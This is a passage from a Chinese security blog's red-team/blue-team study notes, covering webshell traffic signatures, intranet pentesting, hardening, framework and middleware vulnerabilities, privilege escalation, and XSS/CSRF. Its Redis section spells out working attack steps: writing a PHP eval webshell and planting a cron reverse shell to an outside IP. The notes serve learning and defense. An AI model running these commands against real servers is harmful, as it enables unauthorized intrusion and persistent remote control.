<p>使用 aes 加密发起两次请求<br>3.0 相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key, 改为取连接密码的md5加密值的前16位作为密钥<br>一次请求为判断是否可以建立连接，少了两次get获取冰蝎动态密钥的行为，第二次发送<code>phpinfo</code>等代码执行，获取网站的信息</p>
<p>cookie中带JSESSIONID和path&#x3D;&#x2F; ，请求包中的conten-length字段是5740或者5720</p>
<p><strong>哥斯拉</strong></p>
<p>支持 n 种加密<br>采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，建立 session，第二三次请求确认连接</p>
<blockquote>
<p>在响应包的cache-control字段中有no-store，no-cache等特征</p>
<p>所有请求中的cookie字段最后面都存在；特征</p>
<p>哥斯拉在执行命令的过程中存在三个组合的父子进程，也可以类似冰蝎一样检测恶意进程</p>
</blockquote>
<h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><p><strong>内网渗透思路</strong></p>
<ol>
<li>代理穿透</li>
<li>权限维持</li>
<li>内网信息收集</li>
<li>口令爆破</li>
<li>凭据窃取</li>
<li>社工</li>
<li>横行和纵向渗透</li>
<li>拿下域控</li>
</ol>
<p><strong>查看域信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all                        //查询一下本机的一些情况，IP段 网关 属于不属于域</span><br><span class="line">nei view /domain                     //查询有几个域, 查询域列表</span><br><span class="line">net group /domain                    //获得所有域用户组列表</span><br><span class="line">net user /domain                     //获得所有域用户列表</span><br></pre></td></tr></table></figure>





<h4 id="系统加固"><a href="#系统加固" class="headerlink" title="系统加固"></a>系统加固</h4><p>账户安全</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">设置登录时不显示上次登录的用户名，防止弱口令爆破</span><br><span class="line">设置账户锁定策略，比如说登录行为限制次数，达到次数后锁定多长时间</span><br><span class="line">linux</span><br><span class="line">禁用root之外的超级用户   使用password  -l   &lt;用户名&gt;命令来锁定用户   -u解锁</span><br><span class="line">限制普通用户使用sudo提权，或者说限制提权的权限大小</span><br><span class="line">锁定系统中多余的自建账号</span><br><span class="line">设置账户锁定登录失败锁定次数，锁定时间   faillog   -u   &lt;用户名&gt;命令来解锁用户</span><br></pre></td></tr></table></figure>

<p>口令安全</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">设置密码必须符合复杂性要求，比如设置时数字，大写字母，小写字母，特殊字符都要具备</span><br><span class="line">设置最小密码长度不能为0，设置不能使用历史密码</span><br><span class="line">linux</span><br><span class="line">检查shadow中空口令账号，修改口令复杂度，设置密码有效期vim  /etc/login.def命令</span><br></pre></td></tr></table></figure>

<p>服务与端口收敛</p>
<blockquote>
<p>关闭或者限制常见的高危端口，比如说22端口(SSH)，23端口(Telnet)，3389端口(RDP) </p>
<p>compmgmt.msc排查计划任务</p>
<p>linux上iptables封禁IP或者限制端口</p>
</blockquote>
<p>文件权限管理</p>
<blockquote>
<p>linux上chmod修改文件权限</p>
<p>chattr重要文件设置不可修改权限</p>
</blockquote>
<p>系统日志审计</p>
<blockquote>
<p>linux上设置系统日志策略配置文件 </p>
<p>系统日志 &#x2F;var&#x2F;log&#x2F;message </p>
<p>cron日志&#x2F;var&#x2F;log&#x2F;cron </p>
<p>安全日志&#x2F;var&#x2F;log&#x2F;secure</p>
</blockquote>
<p>设备和网络控制</p>
<blockquote>
<p>比如在涉密计算机上禁止访问外网，为了避免用户绕过策略可以禁止用户修改IP </p>
<p>删除默认路由配置，避免利用默认路由探测网络 </p>
<p>禁止使用USB设备比如U盘 </p>
<p>禁止ping命令，即禁用ICMP协议访问，不让外部ping通服务器</p>
</blockquote>
<h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><p><strong>内存马原理</strong></p>
<p>我通过自身的理解，概述的说一下， 内存马的原理就是在web组件或者应用程序中，注册一层访问路由，访问者通过这层路由，来执行我们控制器中的代码</p>
<p>内存马是无文件Webshell，什么是无文件webshell呢？简单来说，就是服务器上不会存在需要链接的webshell脚本文件。那有的同学可能会问了？这种方式为什么能链接呢？内存马的原理就像是MVC架构，即通过路由访问控制器</p>
<p><strong>内存马如何查杀</strong></p>
<p>重启&#x2F;关机，内存马就掉了</p>
<h4 id="常见的框架漏洞"><a href="#常见的框架漏洞" class="headerlink" title="常见的框架漏洞"></a>常见的框架漏洞</h4><p>log4j远程代码执行漏洞</p>
<p>原理：</p>
<p>Log4j 是Apache 的一个开源项目，是一款基于Java 的开源日志记录工具。该漏洞主要是由于日志在打印时当遇到<code>$&#123;</code>后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</p>
<p>具体操作：</p>
<p>在正常的log处理过程中对**${**这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行    </p>
<p><code>Fastjson</code>反序列化漏洞</p>
<p>判断：</p>
<p>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断</p>
<p>原理：</p>
<p>fastjson是阿里巴巴开发的一款将json字符串和java对象进行序列化和反序列化的开源json解析库。fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题</p>
<p>无回显怎么办：</p>
<p>1.一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</p>
<p>2.通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</p>
<p>3.直接将命令执行结果回显到请求poc的HTTP响应中</p>
<p>Shiro反序列化漏洞</p>
<p>原理：</p>
<p>Shiro是Apache下的一个开源Java安全框架，执行身份认证，授权，密码和会话管理。shiro在用户登录时除了账号密码外还提供了可传递选项remember me。用户在登录时如果勾选了remember me选项，那么在下一次登录时浏览器会携带cookie中的remember me字段发起请求，就不需要重新输入用户名和密码</p>
<p>判断：</p>
<p>1.数据返回包中包含rememberMe&#x3D;deleteMe字段</p>
<p>2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的cookie中增加字段：rememberMe&#x3D;然后查看返回数据包中是否存在关键字</p>
<p>shiro-550：</p>
<p>shiro反序列化漏洞利用有两个关键点，首先是在shiro&lt;1.2.4时，AES加密的密钥Key被硬编码在代码里，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据。另外就是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。攻击者构造恶意代码，并且序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行编码，解密并且反序列化，最终造成反序列化漏洞。</p>
<p>shiro-721：</p>
<p>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的Remember</p>
<h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p><strong>IIS</strong></p>
<p>IIS6 解析漏洞</p>
<p>基于文件名，该版本默认会将 <em><strong>.asp;.jpg</strong> 此种格式的文件名，当成asp解析，原理是</em>*服务器默认不解析 ; 号及其后面的内容**，相当于截断</p>
<p>防护</p>
<ol>
<li>限制上传目录执行权限，不允许执行脚本</li>
<li>不允许新建目录</li>
<li>上传的文件需经过重命名时间戳 + 随机数 + .jpg 等</li>
</ol>
<p><strong>Apache</strong></p>
<p>AddHandler导致的解析漏洞， 如果运维人员给 .php 后缀增加了处理器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php.php </span><br></pre></td></tr></table></figure>

<p>那么，在有多个后缀的情况下，只要一个文件名中含有 .php 后缀，即被识别成PHP文件，没必要是最后一个后缀<br>防护同上 IIS6</p>
<p>目录穿越漏洞</p>
<p><strong>Nginx</strong></p>
<p>配置文件错误导致的解析漏洞</p>
<ol>
<li><p>可以直接获取诸如 <code>index.php~  index.php.bak  </code>等文件</p>
</li>
<li><p>对于任意文件名，在后面添加  &#x2F;xxx.php（xxx为任意字符）后，即可将文件作为php解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxxx/a.png/a.php</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>防护</p>
<ol>
<li>匹配对应文件，rewrite返回404</li>
<li>配置 <code>cgi.fix_pathinfo(php.ini中)  </code>为0并重启 <code>php-cgi </code>程序</li>
</ol>
<p><strong>Tomcat</strong></p>
<p>Tomcat 任意文件写入（CVE-2017-12615）</p>
<p>windows+Tomcat 7.0.x+配置文件readonly&#x3D;false，导致我们可以往服务器写文件</p>
<p><strong>Weblogic</strong></p>
<p>任意文件上传漏洞（CVE-2018-2894）</p>
<p>通过截获上传的时间戳找出真正的文件名达到 poc</p>
<p><strong>JBOSS</strong></p>
<p>反序列化</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>Linux提权</p>
<ol>
<li><p>Linux内核漏洞提权   脏牛Dirty COW  Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)</p>
</li>
<li><p>SUID提权（普通用户执行指令的标记）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>查找SUID为root的指令</p>
</li>
<li><p>定时任务提权</p>
</li>
<li><p>环境变量劫持高权限程序</p>
</li>
<li><p>sudoer（用户组）配置文件错误提权</p>
</li>
<li><p>pkexec 本地权限提升漏洞(CVE-2021-4034)</p>
</li>
<li><p>NFS提权</p>
</li>
<li><p>Docker提权</p>
</li>
</ol>
<h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">21 ftp        ftp的端口号20、21的区别一个是数据端口，一个是控制端口，控制端口一般为21</span><br><span class="line">69 TFTP       (简单文件传输协议) </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet</span><br><span class="line">80 web</span><br><span class="line">80-89 web</span><br><span class="line">443 https   SSL心脏滴血</span><br><span class="line">445 SMB     ms17-010永恒之蓝</span><br><span class="line">873 Rsync未授权</span><br><span class="line">1433 MSSQL</span><br><span class="line">1521 Oracle    </span><br><span class="line">3306 MySQL</span><br><span class="line">3389 远程桌面</span><br><span class="line">5432 PostgreSQL</span><br><span class="line">5900 vnc   目前常用的协议有VNC/SPICE/RDP三种 、小巧，支持客户端和服务器端的直接拷贝粘贴，缺点：速度最慢</span><br><span class="line">6379 redis未授权</span><br><span class="line">7001,7002  WebLogic默认弱口令，反序列</span><br><span class="line">8080  tomcat/WDCP主机管理系统，默认弱口令</span><br><span class="line">8080,8089,9090 JBOSS</span><br><span class="line">Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，默认端口是8080</span><br><span class="line">        在windows系统中：</span><br><span class="line">    1098、1099、4444、4445、8083端口在/jboss/server/default/conf/jboss-service.xml中</span><br><span class="line">    8080端口在/jboss/server/default/deploy/jboss-web.deployer/server.xml中</span><br><span class="line">    8093端口在/jboss/server/default/deploy/jms/uil2-service.xml中</span><br><span class="line">    8000-9090 都是一些常见的web端口</span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line">28017 mongodb统计页面</span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br><span class="line"></span><br><span class="line">161 SNMP</span><br><span class="line">389 LDAP</span><br><span class="line">512,513,514 Rexec</span><br><span class="line">1025,111 NFS</span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多）</span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><span class="line">3312/3311 kangle主机管理系统登陆</span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/</span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><span class="line">7778 Kloxo主机控制面板登录</span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多）</span><br><span class="line">8649 ganglia</span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口</span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统</span><br><span class="line">11211 memcache未授权访问</span><br><span class="line">50000 SAP命令执行</span><br></pre></td></tr></table></figure>



<h4 id="如何检测挖矿病毒"><a href="#如何检测挖矿病毒" class="headerlink" title="如何检测挖矿病毒"></a>如何检测挖矿病毒</h4><p>检查数据包中 tcp 连接的传递载荷，如果存在连续几个数据包中都符合 stratum 协议的 json 载荷特征，那么主机就存在挖矿</p>
<p>1、通过流量层面找到挖矿主机</p>
<ul>
<li>协议特征检测：挖矿协议具有特定的数据包类型，大概分成了两类，一类是登录包，一类是提交包，并且这两种包也有明显的特点；</li>
<li>文件检测：流量中还原文件，进行沙箱检测；</li>
<li>主机异常网络行为：攻击者为了实现利益最大化，感染的主机会开始横向移动攻击，如内网扫描、爆破等行为，从而感染更多的机器；</li>
<li>通过协议检测，只能覆盖明文通信的情况，但目前绝大多数矿池都支持了加密通信，所以能够在握手协议和证书两个层面来做一些事情。另外由于挖矿的特殊性，矿池的域名、证书是不会轻易进行变化的，并且矿池的具有聚集属性，即越大的矿池集合到的矿机越多，越能够保证收益的稳定性。所以也可以针对排名较为靠前的矿池进行域名和证书的收集，添加针对性的检测策略；</li>
</ul>
<p>2、通过主机层面判断挖矿主机</p>
<ul>
<li>感染主机后有明显的行为特征，主要包括高CPU 和 GPU 使用率、响应速度慢、 崩溃或频繁重新启动、系统过热、异常网络活动（比如连接挖矿相关的域名或 IP）</li>
<li>主机层面的检测一般会从进程特征，网络连接，文件特征等多个维度进行检测</li>
</ul>
<p>3、威胁情报</p>
<p>通常活跃的挖矿木马都是有明显的家族特征和几个固定版本，可以通过威胁情报关联检测</p>
<h4 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h4><p>redis是非关系型数据库，默认端口6379</p>
<p>利用手段主要有：</p>
<p>1.向root权限账户写入ssh公钥文件，直接免密登录服务器 (受害者redis非root权限运行会报错)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">服务器存在.<span class="property">ssh</span>目录且具有写入的权限 (redis可以创建文件但无法创建目录，所以redis待写入文件所在的目录必须事先存在。 .<span class="property">ssh</span>目录默认没有,需要生成公、私钥或者建立ssh连接时才会生成)</span><br><span class="line">原理：</span><br><span class="line">在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.<span class="property">ssh</span>和默认的缓冲文件authorized.<span class="property">keys</span>，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.<span class="property">ssh</span>下生成一个授权的key</span><br></pre></td></tr></table></figure>

<p>2.写入webshell</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">条件： 已知web绝对路径</span><br><span class="line">步骤：</span><br><span class="line"><span class="number">1.</span>  redis  -cli   -h   <span class="number">192.168</span>.<span class="property">x</span>.<span class="property">x</span>     连接目标服务器</span><br><span class="line"><span class="number">2.</span>  config set dir  <span class="string">&quot;/var/www/html&quot;</span>    设置保存文件路径</span><br><span class="line"><span class="number">3.</span>  config  set dbfilename  shell.<span class="property">php</span>  设置保存文件名</span><br><span class="line"><span class="number">4.</span>  set x  <span class="string">&quot;\n\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;\n&quot;</span>   将webshell写入x键值中</span><br><span class="line"><span class="number">5.</span>  save    保存</span><br><span class="line">局限：</span><br><span class="line"><span class="number">1.</span>服务器处于内网，写入webshell后我们的公网<span class="variable constant_">IP</span>无法连接</span><br><span class="line"><span class="number">2.</span>服务器<span class="variable constant_">IP</span>地址不固定</span><br><span class="line"><span class="number">3.6379</span>端口不允许入方向</span><br><span class="line"><span class="number">4.</span>上传webshell可能直接被杀毒软件删除</span><br></pre></td></tr></table></figure>

<p> 3.定时任务反弹shell</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">步骤：</span><br><span class="line">定时任务用的表达式 ：<span class="title class_">Cron</span>表达式是一个字符串，该字符串由<span class="number">6</span>个空格分为<span class="number">7</span>个域，每一个域代表一个时间含义。分 时 天 月 周    user-<span class="title function_">name</span>(用户) <span class="title function_">command</span>(命令) 比如每过一分钟向root用户的定时任务中写入反弹连接命令</span><br><span class="line">(<span class="number">1</span>) config set dir /<span class="keyword">var</span>/spool/cron/              <span class="comment">//目录切换到定时任务的文件夹中</span></span><br><span class="line">(<span class="number">2</span>) config set dbfilename root                 <span class="comment">//设置保存文件名</span></span><br><span class="line">(<span class="number">3</span>)set x  <span class="string">&quot;\n  *  *  * *  * bash -i &gt;&amp; /dev/tcp/192.168.96.222/7777 0&gt;&amp;1\n&quot;</span> <span class="comment">//将反弹shell写入x键值中</span></span><br><span class="line">(<span class="number">4</span>)save    <span class="comment">//保存</span></span><br></pre></td></tr></table></figure>

<p>利用定时任务反弹shell在目标系统是Centos上可用，Ubuntu上有限制</p>
<p>理由如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>默认redis写文件后是<span class="number">644</span>的权限，但ubuntu要求执行定时任务件/<span class="keyword">var</span>/spool/cron/crontabs/权限必须是<span class="number">600</span>也就是-rw-----才会执行，否则会报错，而<span class="title class_">Centos</span>的定时任务文件权限<span class="number">644</span>也能执行</span><br><span class="line"><span class="number">2.</span>redis保存<span class="variable constant_">RDB</span>会存在乱码，在<span class="title class_">Ubuntu</span>上会报错，而在<span class="title class_">Centos</span>上不会报错</span><br><span class="line"><span class="number">3.</span>两个系统的定时任务文件目录不同</span><br></pre></td></tr></table></figure>

<p>4.主从复制getshell</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">数据读写体量很大时，为了减轻服务器的压力，redis提供了主从模式，主从模式就是指定一个redis实例作为主机，其余的作为从机，其中主机和从机的数据是相同的，而从机只负责读，主机只负责写。通过读写分离可以减轻服务器端的压力</span><br><span class="line"></span><br><span class="line">条件：     版本(<span class="number">4.</span>x~<span class="number">5.0</span><span class="number">.5</span>)</span><br><span class="line">利用工具： <span class="title class_">RedisRogueServer</span>   地址：<span class="attr">https</span>:<span class="comment">//github.com/n0b0dyCN/redis-rogue-server</span></span><br><span class="line">使用工具的命令： python3   redis-rogue-server.<span class="property">py</span>   --rhost=x.<span class="property">x</span>.<span class="property">x</span>.<span class="property">x</span>   --lhost=x.<span class="property">x</span>.<span class="property">x</span>.<span class="property">x</span>   --exp=exp.<span class="property">so</span></span><br><span class="line">两种使用方法：  交互式   反弹式</span><br><span class="line">限制：  利用这个方法getshell或者rce任意导致redis服务瘫痪，一般不建议使用</span><br></pre></td></tr></table></figure>



<p>redis未授权访问漏洞的防范措施：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>添加登录密码</span><br><span class="line"><span class="number">2.</span>修改默认端口</span><br><span class="line"><span class="number">3.</span>关闭端口</span><br><span class="line"><span class="number">4.</span>禁止以root用户权限启动，以低权限启动redis服务</span><br></pre></td></tr></table></figure>



<h4 id="xss和csrf"><a href="#xss和csrf" class="headerlink" title="xss和csrf"></a>xss和csrf</h4><p>XSS：跨站脚本攻击（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。<strong>这类攻击通常包含了HTML以及用户端脚本语言</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 反射型：发出请求时，XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以叫反射型XSS</span><br><span class="line">b.存储型：存储型XSS和反射型XSS的差别在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求时目标页面时不用再提交XSS代码</span><br><span class="line">c.DOM型：DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的，单纯的在前端解析，没有经过后端，属于前端自身的安全漏洞</span><br></pre></td></tr></table></figure>

<p>防御：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.在表单提交或者url参数传递前，对需要的参数进行过滤</span><br><span class="line">2.对字符实体进行转义</span><br><span class="line">  htmlspecialchars() 函数,用于转义处理在页面上显示的文本</span><br><span class="line">  strip_tags() 函数,过滤掉输入、输出里面的恶意标签</span><br><span class="line">3.httponly（禁止JavaScript读取Cookie值，不过在用户与服务端交互的时候，HttpRequest包中仍然会带上这个Cookie信息，  即用户与服务端的正常交互不受影响）</span><br><span class="line">4.浏览器与Web应用端采用相同的字符编码</span><br></pre></td></tr></table></figure>



<p>CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制<strong>用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</strong></p>
<p>（1）登录受信任网站A，并在本地生成Cookie（如果用户没有登录网站A，那么网站B在诱导的时候，请求网站A的api接口时，会提示你登录）<br>（2）在不登出A的情况下，访问危险网站B（其实是利用了网站A的漏洞）<br>注意cookie保证了用户可以处于登录状态，但网站B其实拿不到cookie</p>
<p>防御：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">httponly</span><br><span class="line">token验证</span><br><span class="line">Referer验证：只有是本站的请求，服务器才做响应，如果不是就拦截</span><br><span class="line">再次输入密码</span><br></pre></td></tr></table></figure>



<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>1、CSRF是跨站请求伪造;  XSS是跨域脚本攻击<br>2、CSRF需要用户先登录网站A,获取cookie;  XSS不需要登录<br>3、CSRF是利用网站A本身的漏洞, 去请求网站A的api;  XSS是向网站A注入JS代码,然后执行JS里的代码,篡改网站A的内容（XSS利用的是站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的网站。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>）</p>
<p>4、CSRF攻击的范围有限，仅限于用户可以执行的操作，例如点击恶意链接或访问黑客的网站。相反，XSS攻击提供执行恶意脚本来执行攻击者所选择的任何活动，从而扩大了攻击的范围。</p>
<p>5、在XSS攻击中，恶意代码存储在站点中，而在CSRF攻击中，恶意代码存储在受害用户访问的第三方站点中</p>
<p>SSRF是服务器对用户提供的可控URL地址过于信任，没有经过严格检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p>
<h4 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h4><p>http  file协议</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/">https://micgo.top/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/MySQL%E6%B3%A8%E5%85%A5%E5%86%99shell/"><img class="prev-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MySQL注入写shell</div></div></a></div><div class="next-post pull-right"><a href="/java-security/CC3/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java反序列化——CC3链</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" 